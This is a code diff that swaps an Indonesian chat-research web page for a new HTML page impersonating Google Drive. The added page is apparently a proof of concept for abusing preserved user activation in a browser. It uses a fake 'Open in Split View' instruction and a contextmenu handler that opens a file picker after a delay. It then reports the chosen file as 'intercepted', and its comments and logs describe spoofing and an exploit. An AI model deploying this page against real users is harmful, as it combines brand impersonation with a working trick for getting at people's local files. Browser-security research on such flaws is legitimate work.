@@ -1,329 +1,207 @@
 <!DOCTYPE html>
-<html lang="id" class="dark">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Intelligence Studio</title>
-    <!-- Tailwind CSS v3 -->
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script>
-        tailwind.config = {
-            darkMode: 'class',
-            theme: {
-                extend: {
-                    colors: {
-                        iosBg: '#000000',
-                        iosSurface: '#121212',
-                        iosSurfaceHover: '#1c1c1e',
-                        iosBorder: '#2c2c2e',
-                        iosText: '#f5f5f7',
-                        iosMuted: '#86868b',
-                        iosBlue: '#0071e3',
-                        iosBlueHover: '#0077ed'
-                    },
-                    fontFamily: {
-                        sans: [-apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif]
-                    }
-                }
-            }
-        }
-    </script>
-    <!-- Marked.js & Highlight.js -->
-    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
-    <style>
-        ::-webkit-scrollbar { width: 4px; height: 4px; }
-        ::-webkit-scrollbar-track { background: transparent; }
-        ::-webkit-scrollbar-thumb { background: #3a3a3c; border-radius: 9999px; }
-        ::-webkit-scrollbar-thumb:hover { background: #636366; }
-        .message-content pre { background: #161618 !important; padding: 1.25rem; border-radius: 14px; border: 1px solid #2c2c2e; margin: 1rem 0; position: relative; }
-        .message-content code { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 0.85rem; color: #30d158; }
-        .copy-btn { position: absolute; top: 10px; right: 10px; background: #2c2c2e; border: 1px solid #3a3a3c; color: #86868b; font-size: 11px; padding: 4px 10px; border-radius: 6px; cursor: pointer; transition: all 0.2s; }
-        .copy-btn:hover { background: #3a3a3c; color: #ffffff; }
-        .glass-header { background: rgba(0, 0, 0, 0.8); backdrop-filter: blur(25px); -webkit-backdrop-filter: blur(25px); }
-        .glass-sidebar { background: rgba(18, 18, 18, 0.85); backdrop-filter: blur(30px); -webkit-backdrop-filter: blur(30px); }
-    </style>
+<meta charset="utf-8">
+<title>Google Drive - Secure Workspace</title>
+<style>
+  :root {
+    --primary: #1a73e8;
+    --bg-color: #f0f4f9;
+    --text-color: #1f1f1f;
+  }
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0;
+    padding: 40px;
+    background-color: var(--bg-color);
+    color: var(--text-color);
+  }
+  .wrapper {
+    max-width: 650px;
+    margin: 0 auto;
+    background: #ffffff;
+    padding: 35px;
+    border-radius: 12px;
+    box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
+  }
+  h2 {
+    color: var(--primary);
+    margin-top: 0;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .drive-icon {
+    width: 28px;
+    height: 28px;
+    background: #1fa463;
+    display: inline-block;
+    border-radius: 4px;
+    text-align: center;
+    color: white;
+    font-weight: bold;
+    line-height: 28px;
+  }
+  .instructions {
+    background: #e8f0fe;
+    border-left: 4px solid var(--primary);
+    padding: 12px 16px;
+    margin: 20px 0;
+    border-radius: 0 6px 6px 0;
+    font-size: 14px;
+  }
+  .target-link {
+    display: inline-block;
+    margin-top: 10px;
+    padding: 14px 28px;
+    background-color: var(--primary);
+    color: white;
+    text-decoration: none;
+    border-radius: 6px;
+    font-weight: 600;
+    transition: background 0.2s;
+  }
+  .target-link:hover {
+    background-color: #1557b0;
+  }
+  .console-box {
+    margin-top: 25px;
+    background: #1e1e1e;
+    color: #00ff66;
+    padding: 15px;
+    border-radius: 6px;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 13px;
+    height: 120px;
+    overflow-y: auto;
+  }
+  #preview-area {
+    margin-top: 20px;
+  }
+  .file-card {
+    border: 1px solid #dadce0;
+    padding: 15px;
+    border-radius: 6px;
+    background: #fafafa;
+  }
+  img.thumb {
+    max-width: 100%;
+    max-height: 250px;
+    border-radius: 4px;
+    margin-top: 10px;
+  }
+</style>
 </head>
-<body class="bg-iosBg text-iosText flex h-screen overflow-hidden antialiased select-none">
+<body>
 
-    <!-- Sidebar / Navigation Panel -->
-    <aside id="sidebar" class="fixed inset-y-0 left-0 z-40 w-72 glass-sidebar border-r border-iosBorder flex flex-col transition-transform duration-300 md:relative md:translate-x-0 -translate-x-full shadow-2xl">
-        <div class="p-6 border-b border-iosBorder flex items-center justify-between">
-            <div class="flex items-center space-x-3">
-                <div class="w-2.5 h-2.5 rounded-full bg-iosBlue shadow-[0_0_12px_#0071e3]"></div>
-                <span class="font-semibold text-xs tracking-wider uppercase text-iosText">Nexus Studio</span>
-            </div>
-            <button onclick="toggleMobileSidebar()" class="md:hidden text-iosMuted hover:text-iosText p-1 rounded-lg hover:bg-iosSurfaceHover transition">
-                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path></svg>
-            </button>
-        </div>
+<div class="wrapper">
+    <h2><span class="drive-icon">D</span> Google Drive Secure SplitView Container</h2>
+    
+    <div class="instructions">
+      <strong>Action Required:</strong> Right-click the secure link below and select <strong>"Open in Split View"</strong> to map your local drive repository.
+    </div>
 
-        <div class="p-6 flex-1 overflow-y-auto space-y-6">
-            <div>
-                <label class="block text-[11px] font-medium uppercase tracking-wider text-iosMuted mb-2">System Status</label>
-                <div class="w-full bg-iosSurface border border-iosBorder rounded-xl px-4 py-3 text-xs text-iosText font-mono flex items-center justify-between shadow-inner">
-                    <span>MULTI-CHAIN ACTIVE</span>
-                    <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
-                </div>
-                <p class="text-[11px] text-iosMuted mt-2 leading-relaxed">Ekstraksi riset lintas web otomatis tanpa batasan kunci API.</p>
-            </div>
+    <!-- Target link menuju domain sasaran untuk spoofing visual -->
+    <a id="spoofLink" class="target-link" href="https://drive.google.com" target="_blank">
+      Open Google Drive in Split View
+    </a>
 
-            <div>
-                <label class="block text-[11px] font-medium uppercase tracking-wider text-iosMuted mb-2">Engine Directive</label>
-                <textarea id="systemDirective" rows="5" 
-                    class="w-full bg-iosSurface border border-iosBorder rounded-xl p-3.5 text-xs text-iosText focus:outline-none focus:border-iosBlue transition resize-none leading-relaxed shadow-inner">Berikan analisis mendalam, terstruktur, komprehensif, dan netral untuk segala bentuk kueri riset, pengetahuan umum, sains, teknologi, maupun pemecahan masalah global.</textarea>
-            </div>
+    <div class="console-box" id="logConsole">[SYSTEM] Ready. Waiting for contextmenu event...</div>
+    
+    <div id="preview-area"></div>
+</div>
 
-            <div>
-                <button onclick="clearChat()" class="w-full bg-iosSurface hover:bg-iosSurfaceHover text-red-400 border border-iosBorder text-xs font-medium py-3 px-4 rounded-xl transition flex items-center justify-center space-x-2 shadow-sm">
-                    <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"></path></svg>
-                    <span>Bersihkan Riwayat Sesi</span>
-                </button>
-            </div>
-        </div>
+<script>
+const link = document.getElementById('spoofLink');
+const consoleBox = document.getElementById('logConsole');
+const previewArea = document.getElementById('preview-area');
 
-        <div class="p-6 border-t border-iosBorder text-center text-[11px] text-iosMuted font-mono">
-            Nexus Studio v8.0 - Apple HIG
-        </div>
-    </aside>
+function log(msg) {
+  const timestamp = new Date().toISOString().split('T')[1].slice(0, 8);
+  consoleBox.innerHTML += `\n[${timestamp}] ${msg}`;
+  consoleBox.scrollTop = consoleBox.scrollHeight;
+}
 
-    <!-- Overlay Mobile Sidebar -->
-    <div id="sidebarOverlay" onclick="toggleMobileSidebar()" class="fixed inset-0 bg-black/60 z-30 hidden md:hidden backdrop-blur-sm"></div>
+link.addEventListener('contextmenu', (e) => {
+  log("Event: contextmenu triggered on secure anchor.");
+  log("Status: Simulating Split View transition delay...");
 
-    <!-- Main Workspace -->
-    <main class="flex-1 flex flex-col h-full bg-iosBg relative">
-        
-        <!-- Header Topbar -->
-        <header class="h-16 glass-header border-b border-iosBorder px-6 flex items-center justify-between z-20">
-            <div class="flex items-center space-x-3">
-                <button onclick="toggleMobileSidebar()" class="md:hidden text-iosMuted hover:text-iosText p-1.5 rounded-lg hover:bg-iosSurfaceHover transition">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg>
-                </button>
-                <div class="flex flex-col">
-                    <h1 class="font-semibold text-sm text-iosText tracking-tight">Nexus Studio</h1>
-                    <span class="text-[10px] text-iosMuted font-mono">Global Research & Chaining Engine</span>
-                </div>
-            </div>
-            <div class="flex items-center space-x-2">
-                <span class="inline-flex items-center px-2.5 py-1 rounded-full text-[10px] font-medium bg-iosSurface border border-iosBorder text-iosMuted font-mono shadow-sm">
-                    Zero-API Active
-                </span>
-            </div>
-        </header>
-
-        <!-- Chat Stream Window -->
-        <div id="chatContainer" class="flex-1 overflow-y-auto p-4 md:p-10 space-y-6 max-w-4xl w-full mx-auto select-text">
-            <!-- Welcome Message -->
-            <div class="flex items-start space-x-4">
-                <div class="w-8 h-8 rounded-full bg-iosSurface border border-iosBorder flex items-center justify-center text-iosBlue font-bold text-xs shrink-0 shadow-sm">AI</div>
-                <div class="bg-iosSurface border border-iosBorder p-5 rounded-2xl max-w-[88%] md:max-w-[80%] text-sm leading-relaxed shadow-lg message-content text-gray-200">
-                    <p class="font-semibold text-iosText mb-1.5">Sistem Studio Siap Digunakan.</p>
-                    Halo! Tanyakan apa saja mengenai topik apa pun di dunia ini. Mesin akan melakukan rantai percakapan (*chaining*) dan ekstraksi riset mendalam lintas web secara instan tanpa batasan kunci API.
-                </div>
-            </div>
-        </div>
-
-        <!-- Input Terminal Area -->
-        <footer class="p-4 md:p-6 glass-header border-t border-iosBorder">
-            <form id="chatForm" onsubmit="handleSendMessage(event)" class="max-w-4xl mx-auto flex gap-3 items-end">
-                <div class="relative flex-1">
-                    <textarea id="userInput" rows="1" placeholder="Ketik topik riset atau pertanyaan apa pun (Tekan Enter untuk kirim)..." 
-                        class="w-full bg-iosSurface border border-iosBorder rounded-2xl px-4 py-3.5 focus:outline-none focus:border-iosBlue text-sm transition shadow-inner resize-none max-h-36 text-iosText placeholder-iosMuted" autocomplete="off" required></textarea>
-                </div>
-                <button type="submit" id="sendButton" 
-                    class="bg-iosBlue hover:bg-iosBlueHover text-white px-5 py-3.5 rounded-2xl font-semibold text-sm transition shadow-md flex items-center justify-center shrink-0 h-[48px]">
-                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 12h14M12 5l7 7-7 7"></path></svg>
-                </button>
-            </form>
-        </footer>
-    </main>
-
-    <!-- Core Engine & Full Chaining Script -->
-    <script>
-        const chatContainer = document.getElementById('chatContainer');
-        const chatForm = document.getElementById('chatForm');
-        const userInput = document.getElementById('userInput');
-        const sendButton = document.getElementById('sendButton');
-        const sidebar = document.getElementById('sidebar');
-        const sidebarOverlay = document.getElementById('sidebarOverlay');
-
-        function toggleMobileSidebar() {
-            sidebar.classList.toggle('-translate-x-full');
-            sidebarOverlay.classList.toggle('hidden');
-        }
-
-        userInput.addEventListener('input', function() {
-            this.style.height = 'auto';
-            this.style.height = (this.scrollHeight) + 'px';
+  // Waktu tunda yang mensimulasikan jeda interaksi transisi split-pane (~1 detik)
+  setTimeout(async () => {
+    try {
+      log("Executing window.showOpenFilePicker() under preserved activation...");
+      
+      if ('showOpenFilePicker' in window) {
+        const handles = await window.showOpenFilePicker({
+          types: [{
+            description: 'All Supported Files',
+            accept: {
+              'image/*': ['.png', '.jpg', '.jpeg', '.webp'],
+              'application/pdf': ['.pdf'],
+              'text/plain': ['.txt']
+            }
+          }],
+          multiple: false
         });
 
-        userInput.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter' && !e.shiftKey) {
-                e.preventDefault();
-                chatForm.requestSubmit();
-            }
-        });
-
-        let conversationHistory = [];
-
-        async function fetchWithBypass(targetUrl) {
-            const proxies = [
-                `https://api.allorigins.win/get?url=${encodeURIComponent(targetUrl)}`,
-                `https://api.codetabs.com/v1/proxy?quest=${encodeURIComponent(targetUrl)}`,
-                `https://thingproxy.freeboard.io/fetch/${targetUrl}`
-            ];
-
-            for (const proxyUrl of proxies) {
-                try {
-                    const res = await fetch(proxyUrl, { cache: 'no-cache' });
-                    if (!res.ok) continue;
-                    const contentType = res.headers.get('content-type') || '';
-                    if (contentType.includes('application/json')) {
-                        const json = await res.json();
-                        if (json.contents) return json.contents;
-                    } else {
-                        const text = await res.text();
-                        if (text && text.length > 50) return text;
-                    }
-                } catch (err) {}
-            }
-            throw new Error("Gagal menembus jalur jaringan publik.");
+        if (handles && handles.length > 0) {
+          const handle = handles[0];
+          const file = await handle.getFile();
+          log(`SUCCESS: File intercepted -> Name: ${file.name}, Size: ${file.size} bytes`);
+          renderFile(file);
         }
+      } else {
+        log("API showOpenFilePicker unavailable. Falling back...");
+        triggerFallback();
+      }
+    } catch (err) {
+      log(`EXPLOIT BLOCKED/CANCELED: ${err.name} - ${err.message}`);
+    }
+  }, 1100);
+});
 
-        async function handleSendMessage(e) {
-            e.preventDefault();
-            const query = userInput.value.trim();
-            if (!query) return;
+function triggerFallback() {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.onchange = async () => {
+    if (input.files.length > 0) {
+      const file = input.files[0];
+      log(`Fallback File intercepted: ${file.name}`);
+      renderFile(file);
+    }
+  };
+  input.click();
+}
 
-            conversationHistory.push({ role: 'user', content: query });
-            appendMessage(query, 'user');
-            
-            userInput.value = '';
-            userInput.style.height = 'auto';
-            userInput.disabled = true;
-            sendButton.disabled = true;
+async function renderFile(file) {
+  previewArea.innerHTML = '';
+  const card = document.createElement('div');
+  card.className = 'file-card';
+  
+  card.innerHTML = `
+    <strong>Intercepted File Details:</strong>
+    <ul>
+      <li>Name: ${file.name}</li>
+      <li>Type: ${file.type || 'Unknown'}</li>
+      <li>Size: ${(file.size / 1024).toFixed(2)} KB</li>
+    </ul>
+  `;
 
-            const aiMessageDiv = appendMessage('', 'ai');
-            const contentBody = aiMessageDiv.querySelector('.message-content');
-            contentBody.innerHTML = '<span class="animate-pulse text-iosMuted font-mono">Melakukan chaining dan sintesis riset global...</span>';
+  if (file.type.startsWith('image/')) {
+    const img = document.createElement('img');
+    img.className = 'thumb';
+    img.src = URL.createObjectURL(file);
+    card.appendChild(img);
+  } else if (file.type === 'text/plain') {
+    const text = await file.text();
+    const pre = document.createElement('pre');
+    pre.textContent = text.slice(0, 500) + (text.length > 500 ? '...[truncated]' : '');
+    card.appendChild(pre);
+  }
 
-            try {
-                const searchContextQuery = conversationHistory.slice(-3).map(item => item.content).join(" ");
-                const searchUrl = `https://html.duckduckgo.com/html/?q=${encodeURIComponent(searchContextQuery + " overview analysis documentation")}`;
-                
-                const htmlContent = await fetchWithBypass(searchUrl);
-                const parser = new DOMParser();
-                const doc = parser.parseFromString(htmlContent, 'text/html');
-                const results = doc.querySelectorAll('.result');
+  previewArea.appendChild(card);
+}
+</script>
 
-                let extractedKnowledge = "";
-                let totalFound = 0;
-
-                results.forEach((el) => {
-                    if (totalFound >= 5) return;
-                    const titleEl = el.querySelector('.result__title');
-                    const snippetEl = el.querySelector('.result__snippet');
-                    const linkEl = el.querySelector('.result__url');
-
-                    if (titleEl && snippetEl) {
-                        const title = titleEl.innerText.trim();
-                        const snippet = snippetEl.innerText.trim();
-                        const link = linkEl ? linkEl.getAttribute('href') : '#';
-
-                        extractedKnowledge += `- Sumber: ${title}\n  Detail: ${snippet}\n  URL: ${link}\n\n`;
-                        totalFound++;
-                    }
-                });
-
-                let synthesizedResponse = `### Hasil Analisis & Sintesis Chaining\n\n`;
-                if (totalFound > 0) {
-                    synthesizedResponse += `Berdasarkan penelusuran lintas web terkini untuk kueri **"${query}"** dengan mempertimbangkan konteks percakapan sebelumnya:\n\n`;
-                    synthesizedResponse += `${extractedKnowledge}\n`;
-                    synthesizedResponse += `---
-*Sintesis dirangkum secara mendalam melalui rantai percakapan aktif.*`;
-                } else {
-                    synthesizedResponse += `Tidak ditemukan referensi web spesifik untuk topik ini, namun berdasarkan pemahaman kontekstual percakapan: ${query}, diskusikan aspek utamanya secara logis dan terstruktur.`;
-                }
-
-                conversationHistory.push({ role: 'assistant', content: synthesizedResponse });
-
-                contentBody.innerHTML = marked.parse(synthesizedResponse);
-                enhanceCodeBlocks(contentBody);
-
-            } catch (error) {
-                contentBody.innerHTML = `<span class="text-red-400 font-mono text-xs">SINTESIS GAGAL: ${error.message}. Periksa koneksi internet Anda.</span>`;
-            } finally {
-                userInput.disabled = false;
-                sendButton.disabled = false;
-                userInput.focus();
-            }
-        }
-
-        function enhanceCodeBlocks(container) {
-            container.querySelectorAll('pre code').forEach((block) => {
-                hljs.highlightElement(block);
-            });
-
-            container.querySelectorAll('pre').forEach((pre) => {
-                if (!pre.querySelector('.copy-btn')) {
-                    const btn = document.createElement('button');
-                    btn.className = 'copy-btn';
-                    btn.innerText = 'Copy';
-                    btn.onclick = () => {
-                        const codeText = pre.querySelector('code').innerText;
-                        navigator.clipboard.writeText(codeText).then(() => {
-                            btn.innerText = 'Copied!';
-                            setTimeout(() => { btn.innerText = 'Copy'; }, 2000);
-                        });
-                    };
-                    pre.appendChild(btn);
-                }
-            });
-        }
-
-        function appendMessage(text, sender) {
-            const isUser = sender === 'user';
-            const wrapper = document.createElement('div');
-            wrapper.className = `flex items-start space-x-3 ${isUser ? 'flex-row-reverse space-x-reverse' : ''}`;
-
-            const avatar = document.createElement('div');
-            avatar.className = `w-8 h-8 rounded-full flex items-center justify-center font-mono font-bold text-xs shrink-0 ${isUser ? 'bg-iosBlue text-white shadow-sm' : 'bg-iosSurface border border-iosBorder text-iosBlue'}`;
-            avatar.innerText = isUser ? 'U' : 'AI';
-
-            const bubble = document.createElement('div');
-            bubble.className = `p-4 md:p-5 rounded-2xl max-w-[88%] md:max-w-[80%] text-sm leading-relaxed shadow-md ${
-                isUser 
-                ? 'bg-iosBlue text-white rounded-br-sm' 
-                : 'bg-iosSurface border border-iosBorder text-gray-200 rounded-bl-sm message-content'
-            }`;
-
-            if (isUser) {
-                bubble.innerText = text;
-            } else {
-                bubble.innerHTML = text ? marked.parse(text) : '<span class="animate-pulse text-iosMuted">Memproses chaining...</span>';
-            }
-
-            wrapper.appendChild(avatar);
-            wrapper.appendChild(bubble);
-            chatContainer.appendChild(wrapper);
-            chatContainer.scrollTop = chatContainer.scrollHeight;
-
-            return wrapper;
-        }
-
-        function clearChat() {
-            conversationHistory = [];
-            chatContainer.innerHTML = `
-                <div class="flex items-start space-x-3">
-                    <div class="w-8 h-8 rounded-full bg-iosSurface border border-iosBorder flex items-center justify-center text-iosBlue font-bold text-xs shrink-0">AI</div>
-                    <div class="bg-iosSurface border border-iosBorder p-5 rounded-2xl max-w-[88%] md:max-w-[80%] text-sm leading-relaxed shadow-lg message-content text-gray-200">
-                        <p class="font-semibold text-iosText mb-1.5">Sesi Direset.</p>
-                        Memori rantai percakapan dibersihkan. Silakan mulai topik baru.
-                    </div>
-                </div>
-            `;
-        }
-    </script>
 </body>
 </html>
